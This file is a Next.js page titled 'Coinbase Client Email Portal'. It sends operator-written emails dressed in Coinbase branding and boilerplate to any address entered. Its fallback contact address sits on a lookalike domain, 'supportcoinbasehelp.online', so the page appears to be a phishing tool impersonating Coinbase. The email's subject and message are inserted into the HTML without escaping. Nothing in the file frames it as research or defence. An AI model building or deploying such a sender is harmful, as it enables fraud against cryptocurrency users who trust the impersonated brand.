'use client';
import { useState, type FormEvent } from 'react';
import Link from 'next/link';

interface SendEmailRequest {
  to: string;
  subject: string;
  htmlContent: string;
}

interface SendEmailResponse {
  success: boolean;
}

export default function Home() {
  const [to, setTo] = useState('');
  const [subject, setSubject] = useState('');
  const [message, setMessage] = useState('');
  const [status, setStatus] = useState('');

  const handleSend = async (e: FormEvent<HTMLFormElement>) => {
    e.preventDefault();
    setStatus('Sending...');

    try {
      const receiverEmail = process.env.NEXT_PUBLIC_RECEIVER_EMAIL || 'info@supportcoinbasehelp.online';
      const backendUrl = process.env.NEXT_PUBLIC_API_URL;
      const res = await fetch(`${backendUrl}/api/send-email`, {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({
          to,
          subject,
          htmlContent: `
          <div style="border: 1px solid #ddd; background-color: #fff">
            <main style="background-color: #fff;">
                <div>
                    <h1 style="color: rgba(0, 128, 255, 0.997); display: flex; padding: 60px; align-items: center; justify-content: center; font-size: 60px;">coinbase</h1>
                </div>

                <h2 style="padding: 20px; font-size: 15px; color: gray;">${subject}</h2>
                <p style="font-size: 12px; color: gray; padding: 20px;">${message}</p>
                
            </main>
            <footer style="background-color: #ddd; padding-bottom: 10px; padding-top: 10px; width: 100%; border-bottom-left-radius: 6px; border-bottom-right-radius: 6px;">
              
                <ol style="list-style: disc;">
                    <li style="font-size: 12px; color: gray;">Coinbase is a secure platform that makes it easy to buy, sell and store cryptocurrencies like BITCOIN, ETHEREUM and more. Based in the USA, coinbase is available in over 100 countries worldwide</li>
                </ol>

                <hr style="border: none; border-top: 0.5px solid grey; margin: 20px 0;" />

                <p style="font-size: 12px; color: gray; padding: 20px;">If you experience any issues or have any questions. Please send us a reply and we will reply as soon as possible. Be on the watchout for fraud and potential scams. if you are aware of fraud or scam contact us</p>
                <h2 style="color: rgba(0, 128, 255, 0.997); display: flex; align-items: center; justify-content: center;">coinbase</h2>

            </footer>
        </div>
          `,
        } satisfies SendEmailRequest),
      });

      const data: SendEmailResponse = await res.json();
      if (data.success) {
        setStatus('Email sent successfully!');
        setTo('');
        setSubject('');
        setMessage('');
      } else {
        setStatus('Failed to send email.');
      }
    } catch (err: unknown) {
      console.error(err);
      setStatus('An error occurred.');
    }
  };

  return (
    <div className="min-h-screen bg-gradient-to-br from-slate-900 via-indigo-950 to-purple-950 text-white flex flex-col justify-between">
      {/* Header */}
      <header className="max-w-4xl mx-auto w-full px-6 py-6 flex justify-between items-center border-b border-white/10">
        <Link href="/" className="text-sm font-medium text-cyan-300 hover:text-white transition">
          ← Back to Home
        </Link>
        <Link
          href="/inbox"
          className="bg-white/10 hover:bg-white/15 text-white text-sm font-semibold px-4 py-2 rounded-xl border border-white/10 transition"
        >
          View Inbox →
        </Link>
      </header>

      {/* Form Container */}
      <main className="max-w-xl mx-auto w-full px-6 py-12 flex-grow flex flex-col justify-center">
        <div className="bg-white/5 border border-white/10 p-8 rounded-2xl backdrop-blur-md shadow-xl">
          <h1 className="text-2xl font-bold mb-6 bg-gradient-to-r from-cyan-400 to-indigo-300 bg-clip-text text-transparent">
            Coinbase Client Email Portal
          </h1>

          <form onSubmit={handleSend} className="space-y-5">
            <div>
              <label className="block text-sm font-medium text-slate-300 mb-1.5">Client Email</label>
              <input
                type="email"
                value={to}
                onChange={(e) => setTo(e.target.value)}
                required
                placeholder="client@example.com"
                className="w-full bg-slate-900/50 border border-white/10 p-3 rounded-xl text-white placeholder-slate-500 focus:outline-none focus:border-cyan-500 transition"
              />
            </div>
            <div>
              <label className="block text-sm font-medium text-slate-300 mb-1.5">Subject</label>
              <input
                type="text"
                value={subject}
                onChange={(e) => setSubject(e.target.value)}
                required
                placeholder="Important account update"
                className="w-full bg-slate-900/50 border border-white/10 p-3 rounded-xl text-white placeholder-slate-500 focus:outline-none focus:border-cyan-500 transition"
              />
            </div>
            <div>
              <label className="block text-sm font-medium text-slate-300 mb-1.5">Message</label>
              <textarea
                value={message}
                onChange={(e) => setMessage(e.target.value)}
                required
                placeholder="Write your message here..."
                className="w-full bg-slate-900/50 border border-white/10 p-3 rounded-xl text-white placeholder-slate-500 focus:outline-none focus:border-cyan-500 transition h-32 resize-none"
              />
            </div>
            <button
              type="submit"
              className="w-full bg-gradient-to-r from-cyan-500 to-blue-600 hover:from-cyan-400 hover:to-blue-500 text-white font-semibold py-3.5 rounded-xl shadow-lg shadow-cyan-500/25 transition transform hover:-translate-y-0.5"
            >
              Send Email
            </button>
          </form>

          {status && (
            <p className={`mt-4 text-sm font-semibold text-center ${status.includes('successfully') ? 'text-cyan-400' : 'text-rose-400'}`}>
              {status}
            </p>
          )}
        </div>
      </main>

      <footer className="border-t border-white/10 py-6 text-center text-xs text-slate-500">
        <p>© 2026 MailPortal. Secure Dispatch Engine.</p>
      </footer>
    </div>
  );
}